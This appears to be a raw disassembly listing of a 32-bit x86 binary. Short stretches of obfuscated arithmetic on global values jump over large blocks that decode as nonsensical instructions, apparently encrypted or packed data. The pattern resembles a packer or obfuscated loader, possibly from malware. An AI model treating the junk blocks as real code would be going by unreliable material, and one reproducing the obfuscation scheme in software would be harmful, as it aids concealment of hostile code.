  40ed49:	xor    esi,esi
  40ed4b:	cmp    ecx,eax
  40ed4d:	jne    0x40f1dc
  40ed53:	cmp    esi,edx
  40ed55:	jne    0x40f1dc
  40ed5b:	mov    eax,DWORD PTR [ebp-0xa4]
  40ed61:	mov    ecx,DWORD PTR [ebp-0xc]
  40ed64:	add    eax,0x80ca
  40ed69:	or     eax,ecx
  40ed6b:	mov    ecx,DWORD PTR ds:0x4227a4
  40ed71:	or     eax,0x686
  40ed76:	xor    eax,0x3eec
  40ed7b:	lea    eax,[eax+ecx*1-0xc11b]
  40ed82:	xor    DWORD PTR ds:0x42279c,eax
  40ed88:	mov    eax,DWORD PTR [ebp-0x64]
  40ed8b:	and    eax,0x4dff
  40ed90:	add    eax,DWORD PTR [ebp-0x14]
  40ed93:	mov    ecx,DWORD PTR [ebp-0x94]
  40ed99:	xor    eax,0x676c
  40ed9e:	xor    edx,edx
  40eda0:	div    ecx
  40eda2:	mov    ecx,DWORD PTR [ebp-0x24]
  40eda5:	mov    edx,DWORD PTR [ebp-0x74]
  40eda8:	xor    ecx,0x6e1e
  40edae:	imul   ecx,edx
  40edb1:	mov    edx,DWORD PTR [ebp+0x8]
  40edb4:	push   0x4
  40edb6:	push   0xe4c37b20
  40edbb:	xor    eax,0x3884
  40edc0:	mov    eax,DWORD PTR [eax+edx*1]
  40edc3:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  40edca:	mov    eax,DWORD PTR [ebp-0x34]
  40edcd:	mov    edx,DWORD PTR [ebp-0xb4]
  40edd3:	lea    eax,[edx+eax*1-0x76d2]
  40edda:	mov    edx,DWORD PTR [ebp-0x44]
  40eddd:	mov    esi,DWORD PTR [ebp-0x84]
  40ede3:	or     eax,edx
  40ede5:	xor    edx,edx
  40ede7:	div    esi
  40ede9:	mov    edx,DWORD PTR [ebp-0x54]
  40edec:	add    eax,0x43d7
  40edf1:	xor    eax,0x5e6a
  40edf6:	add    eax,DWORD PTR [edx+ecx*1]
  40edf9:	mov    ecx,DWORD PTR ds:0x42279c
  40edff:	add    DWORD PTR [eax],ecx
  40ee01:	mov    eax,DWORD PTR [ebp-0x90]
  40ee07:	mov    ecx,DWORD PTR [ebp-0x8c]
  40ee0d:	mov    edx,DWORD PTR [ebp-0xa0]
  40ee13:	mov    esi,DWORD PTR [ebp-0x9c]
  40ee19:	sub    edx,eax
  40ee1b:	mov    eax,DWORD PTR [ebp-0xb0]
  40ee21:	sbb    esi,ecx
  40ee23:	mov    ecx,DWORD PTR [ebp-0xac]
  40ee29:	xor    edx,eax
  40ee2b:	mov    eax,DWORD PTR [ebp-0xc0]
  40ee31:	xor    esi,ecx
  40ee33:	mov    ecx,DWORD PTR [ebp-0xbc]
  40ee39:	add    edx,eax
  40ee3b:	adc    esi,ecx
  40ee3d:	add    edx,0x2313
  40ee43:	adc    esi,0x2a00
  40ee49:	push   esi
  40ee4a:	push   edx
  40ee4b:	call   0x422286
  40ee50:	mov    ecx,0x1207
  40ee55:	sub    ecx,eax
  40ee57:	push   0x0
  40ee59:	pop    eax
  40ee5a:	sbb    eax,edx
  40ee5c:	mov    edx,DWORD PTR ds:0x42279c
  40ee62:	xor    esi,esi
  40ee64:	jmp    0x40f1a7
  40ee69:	mov    bh,0x51
  40ee6b:	lods   eax,DWORD PTR ds:[esi]
  40ee6c:	xchg   edi,eax
  40ee6d:	mov    ebx,0x8571b7bb
  40ee72:	pop    ecx
  40ee73:	xor    ch,bl
  40ee75:	push   esp
  40ee76:	xor    BYTE PTR [esi-0x41ed121d],dl
  40ee7c:	mov    esi,0xbebec401
  40ee81:	mov    ebp,0x69226ad
  40ee86:	aad    0xf6
  40ee88:	dec    esi
  40ee89:	addr16 add eax,0xbe0ba57f
  40ee8f:	pop    edx
  40ee90:	xor    al,0x61
  40ee92:	pusha  
  40ee93:	pop    ds
  40ee94:	(bad)  [ebx-0x8]
  40ee97:	jecxz  0x40eeb4
  40ee99:	cdq    
  40ee9a:	scas   al,BYTE PTR es:[edi]
  40ee9b:	rcl    ecx,cl
  40ee9d:	jae    0x40eebb
  40ee9f:	imul   ecx,DWORD PTR [eax+edx*1],0xc9966843
  40eea6:	mov    eax,ds:0xf7ab801f
  40eeab:	adc    al,0xc1
  40eead:	test   ecx,eax
  40eeaf:	sahf   
  40eeb0:	scas   eax,DWORD PTR es:[edi]
  40eeb1:	test   dl,bl
  40eeb3:	inc    BYTE PTR [edx+0x2b]
  40eeb6:	inc    eax
  40eeb7:	sti    
  40eeb8:	pop    ecx
  40eeb9:	hlt    
  40eeba:	ret    0x54cd
  40eebd:	or     BYTE PTR [ebx-0x21],bl
  40eec0:	std    
  40eec1:	pushf  
  40eec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eec3:	and    eax,0x6b9cac01
  40eec8:	clc    
  40eec9:	sbb    WORD PTR [ecx+edx*8+0x954ce12],dx
  40eed1:	sub    al,0x91
  40eed3:	mov    ecx,0xfa5f3c0c
  40eed8:	mov    ch,0xfc
  40eeda:	mov    dl,0x73
  40eedc:	mov    ch,0xa7
  40eede:	or     BYTE PTR [edx+eiz*1+0x15b212e5],ch
  40eee5:	and    DWORD PTR [eax+0x3b15f2e2],ecx
  40eeeb:	add    esp,ebx
  40eeed:	fisttp QWORD PTR [eax+0x1486b5f1]
  40eef3:	mov    bl,BYTE PTR [edi]
  40eef5:	ror    BYTE PTR [ebp-0x72],cl
  40eef8:	std    
  40eef9:	(bad)  
  40eefa:	test   DWORD PTR [edi-0x27],0x925912b5
  40ef01:	inc    DWORD PTR [ebp-0x6]
  40ef04:	inc    ebp
  40ef05:	fcomp  DWORD PTR [edi]
  40ef07:	mov    ch,0xe7
  40ef09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef0a:	push   ecx
  40ef0b:	xchg   ebx,eax
  40ef0c:	and    esp,DWORD PTR [edi-0x755fe67]
  40ef12:	in     al,dx
  40ef13:	jp     0x40ef0c
  40ef15:	imul   BYTE PTR [edi-0x5896e58f]
  40ef1b:	rcr    BYTE PTR ds:0x45e14b41,1
  40ef21:	pop    ss
  40ef22:	in     eax,0x77
  40ef24:	out    dx,eax
  40ef25:	stos   DWORD PTR es:[edi],eax
  40ef26:	push   ds
  40ef27:	sbb    cl,bh
  40ef29:	call   0x1563:0xa63d4d81
  40ef30:	(bad)  [edx+ebx*8-0x6723c4e8]
  40ef37:	cmp    dl,BYTE PTR [esi+0x54]
  40ef3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef3b:	les    ecx,FWORD PTR ds:0x1a9671c5
  40ef41:	inc    esp
  40ef42:	scas   al,BYTE PTR es:[edi]
  40ef43:	scas   al,BYTE PTR es:[edi]
  40ef44:	pop    ebp
  40ef45:	cld    
  40ef46:	fsubr  DWORD PTR [edi-0x57]
  40ef49:	xchg   edi,eax
  40ef4a:	sahf   
  40ef4b:	mov    BYTE PTR [esi+ecx*4-0x263c2a64],cl
  40ef52:	mov    edi,0x6d345cea
  40ef57:	xor    ah,al
  40ef59:	clc    
  40ef5a:	data16 jl 0x40ef0a
  40ef5d:	cmp    BYTE PTR [eax],bh
  40ef5f:	sbb    BYTE PTR [esi+0x6a32fe31],dl
  40ef65:	scas   al,BYTE PTR es:[edi]
  40ef66:	and    ebx,DWORD PTR [ecx+0x7d]
  40ef69:	daa    
  40ef6a:	push   edx
  40ef6b:	mov    fs,WORD PTR [eax+eax*4+0x324e5e4b]
  40ef72:	(bad)  
  40ef73:	std    
  40ef74:	lea    ebp,[edx-0x525c8688]
  40ef7a:	xlat   BYTE PTR ds:[ebx]
  40ef7b:	inc    eax
  40ef7c:	xlat   BYTE PTR ds:[ebx]
  40ef7d:	dec    esp
  40ef7e:	xor    BYTE PTR [ecx],0x85
  40ef81:	and    eax,0x25edbf34
  40ef86:	mov    esp,0x4988ac0d
  40ef8b:	xchg   esp,eax
  40ef8c:	test   eax,0x6dcd89f2
  40ef91:	pop    es
  40ef92:	shr    BYTE PTR [ebp-0x531b7b40],cl
  40ef98:	sbb    DWORD PTR [ecx+esi*1-0x1878c89f],0xc0ae3e7c
  40efa3:	sbb    dl,dl
  40efa5:	xchg   DWORD PTR [ebp+0x48986a21],ebp
  40efab:	pusha  
  40efac:	adc    eax,0xfa6f6edc
  40efb1:	in     eax,0x12
  40efb3:	jmp    0x40effa
  40efb5:	mov    ebx,0xd072d79e
  40efba:	or     al,0x1e
  40efbc:	push   eax
  40efbd:	ins    BYTE PTR es:[edi],dx
  40efbe:	push   ebp
  40efbf:	jle    0x40efbb
  40efc1:	mov    eax,0xdc647f42
  40efc6:	mov    esi,0x4138d167
  40efcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efcc:	dec    ebp
  40efcd:	test   eax,0x3473dcf3
  40efd2:	or     ebp,ebx
  40efd4:	retf   0xcec3
  40efd7:	gs jns 0x40efa9
  40efda:	fist   DWORD PTR [esi-0x6b]
  40efdd:	xchg   ebx,eax
  40efde:	jae    0x40eff3
  40efe0:	or     al,0xb8
  40efe2:	mov    cl,bh
  40efe4:	repnz sub ah,dl
  40efe7:	jo     0x40efbb
  40efe9:	aad    0x97
  40efeb:	(bad)  
  40efec:	rcr    BYTE PTR [ecx],cl
  40efee:	xor    cl,BYTE PTR [ebx+edx*2]
  40eff1:	aam    0x77
  40eff3:	and    ah,BYTE PTR [edi]
  40eff5:	jmp    0x32a06216
  40effa:	sbb    al,dh
  40effc:	and    esi,DWORD PTR [ecx-0x2e4f7a1]
  40f002:	inc    edi
  40f003:	and    bl,BYTE PTR [ecx-0x6d]
  40f006:	cs mov eax,0x3ad86c6f
  40f00c:	rcl    dl,0x1b
  40f00f:	dec    esi
  40f010:	fwait
  40f011:	aad    0x4f
  40f013:	out    dx,eax
  40f014:	mov    bl,0x7c
  40f016:	push   esi
  40f017:	mov    al,ds:0xaf359600
  40f01c:	pop    ebx
  40f01d:	loop   0x40efc5
  40f01f:	xchg   esi,eax
  40f020:	pop    esi
  40f021:	xchg   BYTE PTR [ecx+0x11],bh
  40f024:	stos   DWORD PTR es:[edi],eax
  40f025:	mov    dl,ch
  40f027:	mov    eax,0x63effa5c
  40f02c:	mov    BYTE PTR [ebx],ah
  40f02e:	push   esi
  40f02f:	mov    ebx,0xd26075f7
  40f034:	and    eax,0xa39545b5
  40f039:	dec    ebp
  40f03a:	or     edx,DWORD PTR [ebx-0x57]
  40f03d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f03e:	push   es
  40f03f:	adc    cl,dl
  40f041:	sti    
  40f042:	out    dx,eax
  40f043:	cdq    
  40f044:	mov    ah,BYTE PTR [ecx-0x4c3d7012]
  40f04a:	jnp    0x40eff0
  40f04c:	das    
  40f04d:	adc    BYTE PTR [edi],dh
  40f04f:	cmp    BYTE PTR [esi+0x1a],dh
  40f052:	jb     0x40f014
  40f054:	cwde   
  40f055:	jge    0x40f04f
  40f057:	imul   ecx,DWORD PTR [ebx],0x6375a5d7
  40f05d:	gs and eax,0xbbc869d8
  40f063:	xlat   BYTE PTR ds:[ebx]
  40f064:	daa    
  40f065:	ds mov ecx,0xbb4cab8e
  40f06b:	adc    al,0xbc
  40f06d:	xchg   esi,eax
  40f06e:	psraw  mm6,QWORD PTR [eax]
  40f071:	push   es
  40f072:	lea    ebp,[edi-0x37db4887]
  40f078:	shl    cl,cl
  40f07a:	jne    0x40f012
  40f07c:	mov    ds:0xb0241651,eax
  40f081:	mov    ?,edx
  40f083:	fnsave ss:[ecx-0x684e189a]
  40f08a:	fild   QWORD PTR [ecx-0xea9b539]
  40f090:	in     eax,0xbe
  40f092:	icebp  
  40f093:	neg    DWORD PTR [ecx+0x0]
  40f096:	mov    esi,0xb66952c6
  40f09b:	fs call 0xa6df6e38
  40f0a1:	fld    QWORD PTR [ebx+0xb]
  40f0a4:	push   ebp
  40f0a5:	out    0xf6,eax
  40f0a7:	repz inc ebx
  40f0a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0aa:	ror    edx,0xa1
  40f0ad:	mov    eax,ds:0x6071d3ca
  40f0b2:	jle    0x40f055
  40f0b4:	jmp    0x9318:0xe6fe8aa4
  40f0bb:	in     eax,dx
  40f0bc:	test   eax,0x9fb2dc9a
  40f0c1:	xchg   DWORD PTR [ecx-0x1e],ebx
  40f0c4:	inc    esi
  40f0c5:	gs push eax
  40f0c7:	ds in  al,0xee
  40f0ca:	enter  0xb50,0xc5
  40f0ce:	sar    BYTE PTR [edx],1
  40f0d0:	stos   DWORD PTR es:[edi],eax
  40f0d1:	mov    ds:0xb0370d97,al
  40f0d6:	or     ch,BYTE PTR [edi-0x2b]
  40f0d9:	inc    edx
  40f0da:	jp     0x40f086
  40f0dc:	mov    ds:0x466e599e,eax
  40f0e1:	mov    dl,0x8f
  40f0e3:	and    al,0xf9
  40f0e5:	xchg   edi,eax
  40f0e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0e7:	test   al,0xf1
  40f0e9:	out    dx,al
  40f0ea:	mov    dl,0x5f
  40f0ec:	mov    al,ds:0xaae35c16
  40f0f1:	add    al,0xf0
  40f0f3:	cmp    al,0x4d
  40f0f5:	jl     0x40f102
  40f0f7:	lea    ebx,[ebp+esi*8+0x39b7ddc9]
  40f0fe:	fild   WORD PTR fs:[ebp+0x30]
  40f102:	and    eax,0xb11374d1
  40f107:	mov    eax,ds:0xbb53b646
  40f10c:	repnz push 0xacceaf68
  40f112:	cwde   
  40f113:	jb     0x40f0c6
  40f115:	pop    ebx
  40f116:	pop    ss
  40f117:	arpl   WORD PTR [ebp-0x4f406cf4],ax
  40f11d:	mov    edi,0x9bcd3258
  40f122:	fldcw  WORD PTR [ecx+edx*2+0x7643c04c]
  40f129:	lock fs ja 0x40f10e
  40f12d:	(bad)  
  40f12f:	js     0x40f170
  40f131:	cdq    
  40f132:	push   esp
  40f133:	push   0x3a
  40f135:	sbb    esp,eax
  40f137:	inc    ebp
  40f138:	xor    DWORD PTR [edx+0x7a],edx
  40f13b:	adc    al,0xb9
  40f13d:	in     al,0xf3
  40f13f:	sbb    BYTE PTR ds:0x76c379d8,cl
  40f145:	jge    0x40f13a
  40f147:	lds    esp,FWORD PTR [eax+0x47]
  40f14a:	retf   0xdd28
  40f14d:	jle    0x40f144
  40f14f:	test   eax,0xbc336ee5
  40f154:	mov    ah,BYTE PTR [edx]
  40f156:	jmp    FWORD PTR [ebp+0x36]
  40f159:	jne    0x40f154
  40f15b:	shl    DWORD PTR gs:[eax],1
  40f15e:	add    cl,dl
  40f160:	dec    ebx
  40f161:	dec    edi
  40f162:	xchg   esi,eax
  40f163:	xchg   edi,eax
  40f164:	pop    eax
  40f165:	adc    ebp,DWORD PTR ds:[esi+esi*1]
  40f169:	push   edi
  40f16a:	push   ds
  40f16b:	mov    bl,0x98
  40f16d:	xor    eax,0x1d96e06
  40f172:	adc    DWORD PTR [edi+ecx*8+0xb9ed5dc],ebp
  40f179:	inc    ebx
  40f17a:	outs   dx,BYTE PTR ds:[esi]
  40f17b:	lahf   
  40f17c:	imul   eax,DWORD PTR [eax+0x1],0x97bb452a
  40f183:	pop    ebx
  40f184:	mov    al,ds:0xce483414
  40f189:	es aas 
  40f18b:	div    BYTE PTR [eax]
  40f18d:	mul    BYTE PTR [edi]
  40f18f:	idiv   BYTE PTR [ebx]
  40f191:	aam    0x5b
  40f193:	mov    BYTE PTR [ecx],dl
  40f195:	ret    0xdfc
  40f198:	push   ebx
  40f199:	push   ebx
  40f19a:	dec    ecx
  40f19b:	push   ebx
  40f19c:	xchg   edx,eax
  40f19d:	adc    eax,0x40d7aa49
  40f1a2:	mov    edx,0xe894f9d3
  40f1a7:	cmp    edx,ecx
  40f1a9:	jne    0x40f1dc
  40f1af:	cmp    esi,eax
  40f1b1:	jne    0x40f1dc
  40f1b7:	mov    eax,DWORD PTR [ebp-0x4]
  40f1ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f1bd:	add    eax,0x4296
  40f1c2:	shr    eax,0x2
  40f1c5:	or     eax,ecx
  40f1c7:	mov    ecx,DWORD PTR [ebp-0x10]
  40f1ca:	xor    eax,ecx
  40f1cc:	xor    eax,0x4e94
  40f1d1:	add    eax,DWORD PTR ds:0x42279c
  40f1d7:	mov    ds:0x4227a4,eax
  40f1dc:	pop    esi
  40f1dd:	leave  
  40f1de:	ret    0x4
  40f1e1:	push   ebp
  40f1e2:	mov    ebp,esp
  40f1e4:	sub    esp,0x58
  40f1e7:	push   ebx
  40f1e8:	push   esi
  40f1e9:	jmp    0x40f59d
  40f1ee:	jne    0x40f25e
  40f1f0:	mov    ds:0xb73caafc,al
  40f1f5:	je     0x40f1e5
  40f1f7:	fsubr  QWORD PTR [ecx+edx*8+0x1b]
  40f1fb:	or     eax,0x1831a4fa
  40f200:	mov    esi,0xbec4e3be
  40f205:	mov    esi,0x93b93be0
  40f20a:	ror    DWORD PTR [edx],0x5b
  40f20d:	test   esp,ecx
  40f20f:	jns    0x40f1b8
  40f211:	(bad)  
  40f212:	leave  
  40f213:	in     eax,dx
  40f214:	or     eax,0x52743137
  40f219:	iret   
  40f21a:	pop    ebp
  40f21b:	fstp   DWORD PTR [esi+0x50]
  40f21e:	sbb    ecx,esi
  40f220:	rcr    DWORD PTR [ecx],cl
  40f222:	dec    ecx
  40f223:	sbb    edx,esi
  40f225:	dec    esi
  40f226:	(bad)  
  40f227:	and    al,0xd1
  40f229:	sti    
  40f22a:	jnp    0x40f200
  40f22c:	add    bl,BYTE PTR ds:0xdb93e3e3
  40f232:	and    al,0x8
  40f234:	lds    esi,FWORD PTR [esi+0x8]
  40f237:	xor    BYTE PTR [eax-0x2e],ah
  40f23a:	sbb    bl,al
  40f23c:	sub    esi,ebp
  40f23e:	(bad)  
  40f23f:	sbb    DWORD PTR [ecx],esi
  40f241:	pop    edi
  40f242:	imul   ecx,ebx,0xbc0352a1
  40f248:	std    
  40f249:	dec    eax
  40f24a:	pusha  
  40f24b:	xchg   ecx,eax
  40f24c:	int3   
  40f24d:	data16 fwait
  40f24f:	arpl   WORD PTR [ecx],cx
  40f251:	in     al,dx
  40f252:	(bad)  
  40f253:	call   0xbfae08ab
  40f258:	inc    edi
  40f259:	xor    ebx,edx
  40f25b:	aam    0x9c
  40f25d:	sti    
  40f25e:	imul   ebx,DWORD PTR [ecx+0x46],0xa80a4d22
  40f265:	shl    DWORD PTR [ecx+0x137cc014],0x81
  40f26c:	scas   eax,DWORD PTR es:[edi]
  40f26d:	ret    
  40f26e:	xchg   ebx,eax
  40f26f:	out    dx,al
  40f270:	mov    cl,0x42
  40f272:	xchg   esi,eax
  40f273:	inc    edi
  40f274:	dec    edx
  40f275:	add    BYTE PTR [esi+0x15f6bf52],ch
  40f27b:	pop    ds
  40f27c:	jmp    0x40f248
  40f27e:	mov    WORD PTR [ecx-0x32],ds
  40f281:	daa    
  40f282:	pop    ebx
  40f283:	call   0xb2d3fb12
  40f288:	and    ch,BYTE PTR [edi+0x1b]
  40f28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f28c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f28d:	test   BYTE PTR [ebx+0xa],bl
  40f290:	aad    0x66
  40f292:	xor    DWORD PTR [esp+ebp*2-0xd649523],esi
  40f299:	sbb    cl,al
  40f29b:	or     BYTE PTR [ebx],ch
  40f29d:	adc    BYTE PTR [edx],0x25
  40f2a0:	lods   al,BYTE PTR ds:[esi]
  40f2a1:	shr    BYTE PTR [ebx+0x1c],cl
  40f2a4:	jb     0x40f304
  40f2a6:	jecxz  0x40f2b3
  40f2a8:	and    DWORD PTR [edi-0x27cc3f7],esi
  40f2ae:	dec    edx
  40f2af:	jns    0x40f2f8
  40f2b1:	jno    0x40f31b
  40f2b3:	sbb    BYTE PTR [edx-0x41],bl
  40f2b6:	jno    0x40f30a
  40f2b8:	imul   dh
  40f2ba:	dec    ebx
  40f2bb:	outs   dx,DWORD PTR ds:[esi]
  40f2bc:	call   0xf6adba4c
  40f2c1:	hlt    
  40f2c2:	lock cdq 
  40f2c4:	mov    ds:0xfc027752,eax
  40f2c9:	test   ax,0xeb0f
  40f2cd:	enter  0xbe1d,0x1b
  40f2d1:	and    esi,DWORD PTR [edi-0x62028448]
  40f2d7:	rcl    BYTE PTR [eax-0x4cffe4ce],cl
  40f2dd:	lea    ebx,[eax]
  40f2df:	adc    al,0x38
  40f2e1:	xchg   DWORD PTR [edi-0x24],eax
  40f2e4:	dec    ecx
  40f2e5:	ret    
  40f2e6:	fst    DWORD PTR [ebx]
  40f2e8:	jnp    0x40f329
  40f2ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2eb:	mov    edi,DWORD PTR [esi-0x17]
  40f2ee:	adc    eax,0x58bac8ed
  40f2f3:	out    0xbc,eax
  40f2f5:	fistp  QWORD PTR [eax-0x5e]
  40f2f8:	jle    0x40f32b
  40f2fa:	mov    ecx,0x4caf880e
  40f2ff:	xchg   ebx,eax
  40f300:	scas   eax,DWORD PTR es:[edi]
  40f301:	jecxz  0x40f30d
  40f303:	pop    edi
  40f304:	out    0x3c,eax
  40f306:	xor    ah,BYTE PTR [ebx-0xa]
  40f309:	jmp    0x748d1e88
  40f30e:	sbb    BYTE PTR [ebp-0x580460aa],ah
  40f314:	pop    ss
  40f315:	enter  0xb025,0x13
  40f319:	pop    es
  40f31a:	cmp    ch,BYTE PTR [ebp+0x3e05fa38]
  40f320:	inc    edx
  40f321:	inc    ebp
  40f322:	add    eax,DWORD PTR [ebx]
  40f324:	std    
  40f325:	cmp    bh,ah
  40f327:	loopne 0x40f2e1
  40f329:	sbb    DWORD PTR [ecx-0x1e],ebp
  40f32c:	dec    edx
  40f32d:	pop    ecx
  40f32e:	xor    al,0x6c
  40f330:	aaa    
  40f331:	in     eax,0xa1
  40f333:	xlat   BYTE PTR ds:[ebx]
  40f334:	or     DWORD PTR [edx],ebp
  40f336:	fwait
  40f337:	ss loop 0x40f2f3
  40f33a:	inc    edi
  40f33b:	iret   
  40f33c:	and    al,0x81
  40f33e:	(bad)  
  40f33f:	stc    
  40f340:	les    ebp,FWORD PTR [edx+0x21]
  40f343:	imul   esp,DWORD PTR [esi+0x57],0x18
  40f347:	or     DWORD PTR [edi+0x77],ebx
  40f34a:	test   BYTE PTR [edi-0xb7c1948],bh
  40f350:	(bad)  
  40f351:	jmp    0xc7e9:0x2dc8e4f1
  40f358:	pushf  
  40f359:	sub    BYTE PTR [ebx-0x1b3ea508],0x96
  40f360:	mov    cl,0x55
  40f362:	mov    ecx,0x591ad9e2
  40f367:	inc    ebp
  40f368:	jns    0x40f31f
  40f36a:	mov    ds:0x1296b562,al
  40f36f:	sbb    bl,BYTE PTR [ecx]
  40f371:	jmp    0x40f3b4
  40f373:	dec    ebp
  40f374:	mov    bh,0xf8
  40f376:	sub    al,BYTE PTR [edx-0x67fd7f]
  40f37c:	xor    ah,BYTE PTR [esi+ebx*4]
  40f37f:	ss inc ebx
  40f381:	and    DWORD PTR [esi-0x7e],edx
  40f384:	inc    ebx
  40f385:	stos   BYTE PTR es:[edi],al
  40f386:	xchg   edx,eax
  40f387:	adc    al,0xc7
  40f389:	int    0x56
  40f38b:	ss ins DWORD PTR es:[edi],dx
  40f38d:	int3   
  40f38e:	ret    
  40f38f:	cwde   
  40f390:	popa   
  40f391:	jae    0x40f338
  40f393:	sti    
  40f394:	ror    BYTE PTR [ecx+0x49],1
  40f397:	xchg   ecx,eax
  40f398:	bound  ebx,QWORD PTR [edi+edi*2]
  40f39b:	add    DWORD PTR [ebp-0x3b5e18ab],edi
  40f3a1:	call   0xa5b8:0xf8b75e95
  40f3a8:	dec    ebx
  40f3a9:	call   0x9dc5:0xc123894
  40f3b0:	mov    es,WORD PTR [ebx]
  40f3b2:	dec    esi
  40f3b3:	push   ebx
  40f3b4:	mov    ebp,0x66a02764
  40f3b9:	pop    ss
  40f3ba:	adc    eax,0x27499268
  40f3bf:	in     al,0x1e
  40f3c1:	dec    eax
  40f3c2:	add    al,0x85
  40f3c4:	shl    DWORD PTR [ebp+eiz*2-0x3366e4b8],cl
  40f3cb:	enter  0x5fda,0xa5
  40f3cf:	fmul   DWORD PTR [ebp-0x792eee74]
  40f3d5:	hlt    
  40f3d6:	mov    ebx,edi
  40f3d8:	mov    ecx,0xb547de74
  40f3dd:	sub    al,0x3b
  40f3df:	lods   eax,DWORD PTR es:[esi]
  40f3e1:	dec    DWORD PTR [edx]
  40f3e3:	les    esi,FWORD PTR [eax]
  40f3e5:	push   ds
  40f3e6:	cld    
  40f3e7:	dec    esp
  40f3e8:	mov    dl,0x8c
  40f3ea:	sbb    dh,BYTE PTR [ebp+0x44]
  40f3ed:	push   0x11814ed9
  40f3f2:	jb     0x40f382
  40f3f4:	push   es
  40f3f5:	imul   eax,DWORD PTR [ecx+eiz*1+0x17],0x30
  40f3fa:	pop    ebp
  40f3fb:	jae    0x40f3ab
  40f3fd:	jp     0x40f41a
  40f3ff:	je     0x40f447
  40f401:	mov    ds:0xb98d52ab,al
  40f406:	inc    eax
  40f407:	ds sbb esi,eax
  40f40a:	mov    al,0x97
  40f40c:	sub    DWORD PTR [eax-0x4c],ecx
  40f40f:	sti    
  40f410:	add    DWORD PTR [edi-0x32b6fb93],0x2f2eeb2d
  40f41a:	(bad)  
  40f41b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f41c:	shl    DWORD PTR [esi-0x5b],1
  40f41f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f420:	pop    ebp
  40f421:	or     bl,BYTE PTR [eax+0x12]
  40f424:	leave  
  40f425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f426:	enter  0xf937,0x39
  40f42a:	arpl   WORD PTR [ecx+0x53267d8e],ax
  40f430:	push   edi
  40f431:	mov    BYTE PTR [edi+0x3d],bh
  40f434:	push   edx
  40f435:	in     al,dx
  40f436:	dec    esi
  40f437:	cmc    
  40f438:	fisubr WORD PTR [ebx+0x45]
  40f43b:	ror    BYTE PTR [edx-0x53],cl
  40f43e:	int    0xb4
  40f440:	pop    esp
  40f441:	or     edi,esp
  40f443:	push   es
  40f444:	mov    al,0x6e
  40f446:	shr    DWORD PTR [esi+0x3afc0893],cl
  40f44c:	inc    ebx
  40f44d:	pop    esi
  40f44e:	push   es
  40f44f:	mov    ecx,0xbf693d2b
  40f454:	aas    
  40f455:	cld    
  40f456:	jbe    0x40f4c2
  40f458:	loope  0x40f459
  40f45a:	xchg   esp,edi
  40f45c:	pop    esi
  40f45d:	jne    0x40f419
  40f45f:	inc    ebx
  40f460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f461:	aad    0x97
  40f463:	xchg   esp,eax
  40f464:	cmp    BYTE PTR [eax],0xca
  40f467:	add    al,0xdc
  40f469:	push   cs
  40f46a:	or     eax,0xccd6ffbd
  40f46f:	push   eax
  40f470:	aaa    
  40f471:	int3   
  40f472:	ret    0xeb3e
  40f475:	xchg   ebp,eax
  40f476:	jp     0x40f3fa
  40f478:	sub    dl,BYTE PTR [esi+0x5]
  40f47b:	(bad)  
  40f47c:	xor    al,0x6f
  40f47e:	jbe    0x40f45c
  40f480:	mov    ah,0x3a
  40f482:	inc    ebp
  40f483:	push   esp
  40f484:	cmp    dl,BYTE PTR [ebx-0x6827bab4]
  40f48a:	in     eax,dx
  40f48b:	mov    al,0x2e
  40f48d:	ret    0x63bb
  40f490:	jge    0x40f480
  40f492:	arpl   sp,di
  40f494:	and    al,0x48
  40f496:	jecxz  0x40f4bb
  40f498:	popa   
  40f499:	push   0x1b
  40f49b:	jl     0x40f4bb
  40f49d:	mov    bh,0x72
  40f49f:	xor    ah,BYTE PTR [edi]
  40f4a1:	xchg   bh,ch
  40f4a3:	int3   
  40f4a4:	pop    edi
  40f4a5:	dec    ebp
  40f4a6:	rol    BYTE PTR [ecx+0x38e51a57],cl
  40f4ac:	or     BYTE PTR [edx+0x18682cac],ch
  40f4b2:	mov    ch,0x85
  40f4b4:	out    0x7a,eax
  40f4b6:	push   0xffffff82
  40f4b8:	xor    edx,edi
  40f4ba:	lds    ecx,FWORD PTR [edx]
  40f4bc:	ins    BYTE PTR es:[edi],dx
  40f4bd:	inc    DWORD PTR [ebp-0x4e]
  40f4c0:	sub    eax,0x6ebdafec
  40f4c5:	jl     0x40f49f
  40f4c7:	cmp    edi,ebx
  40f4c9:	sahf   
  40f4ca:	jp     0x40f4fd
  40f4cc:	lods   eax,DWORD PTR ds:[esi]
  40f4cd:	ss push ebx
  40f4cf:	xlat   BYTE PTR ds:[ebx]
  40f4d0:	repnz leave 
  40f4d2:	sysret 
  40f4d4:	xchg   bl,bh
  40f4d6:	xor    ax,0x2de
  40f4da:	push   ebp
  40f4db:	bnd jae 0x40f474
  40f4de:	xor    BYTE PTR [ecx-0x214f9c24],cl
  40f4e4:	test   BYTE PTR ds:0x8faf6a8c,ah
  40f4ea:	fadd   DWORD PTR [edi+eax*8+0x7206ee]
  40f4f1:	fsubr  QWORD PTR [edx-0x3c6ab986]
  40f4f7:	jg     0x40f50d
  40f4f9:	mov    ebp,0x66ad9358
  40f4fe:	pop    es
  40f4ff:	add    dh,dh
  40f501:	jne    0x40f558
  40f503:	ret    0xefba
  40f506:	xor    cl,BYTE PTR ds:0x5847627c
  40f50c:	jnp    0x40f4a4
  40f50e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f50f:	retf   0xf7cc
  40f512:	and    al,0x52
  40f514:	in     al,dx
  40f515:	arpl   ax,sp
  40f517:	push   esi
  40f518:	hlt    
  40f519:	xchg   esi,eax
  40f51a:	mov    al,ds:0x818781dd
